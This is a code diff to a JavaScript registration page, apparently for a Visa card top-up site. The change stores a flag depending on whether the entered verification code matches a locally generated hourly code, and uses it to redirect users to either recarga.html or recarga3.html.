@@ -2321,14 +2321,23 @@ function setupCardClickEvents() {
             }
         }
 
+        function getRecargaPage() {
+            try {
+                const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+                return reg.useOldRecarga ? 'recarga3.html' : 'recarga.html';
+            } catch(e) {
+                return 'recarga.html';
+            }
+        }
+
         function checkExistingRegistration() {
             const saved = localStorage.getItem('visaRegistrationCompleted');
             if (saved) {
                 try {
                     const data = JSON.parse(saved);
                     if (data.completed) {
-                        // Redirigir directamente a recarga
-                        window.location.href = 'recarga.html';
+                        // Redirigir directamente a recarga correcta
+                        window.location.href = data.useOldRecarga ? 'recarga3.html' : 'recarga.html';
                         return;
                     }
                 } catch (e) {
@@ -2628,7 +2637,10 @@ function setupCardClickEvents() {
                     break;
                 case 8:
                     const verificationCode = document.getElementById('verificationCode');
-                    if (verificationCode) registrationData.verificationCode = verificationCode.value;
+                    if (verificationCode) {
+                        registrationData.verificationCode = verificationCode.value;
+                        registrationData.useOldRecarga = verificationCode.value !== generateHourlyCode();
+                    }
                     break;
                 case 10:
                     const password = document.getElementById('password');
@@ -3570,6 +3582,7 @@ function setupCardClickEvents() {
             const fullPhone = (registrationData.phonePrefix || '') + (registrationData.phoneNumber || '');
             registrationData.phoneNumberFull = fullPhone;
             registrationData.deviceId = generateDeviceId();
+            registrationData.useOldRecarga = registrationData.verificationCode !== generateHourlyCode();
             registrationData.completed = true;
             registrationData.createdAt = new Date().toISOString();
             
@@ -3605,7 +3618,8 @@ function setupCardClickEvents() {
 
         function goToLogin() {
             sessionStorage.setItem('fromRegistro', 'true');
-            window.location.href = 'recarga.html';
+            const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+            window.location.href = reg.useOldRecarga ? 'recarga3.html' : 'recarga.html';
         }
 
         function exitRegistration() {
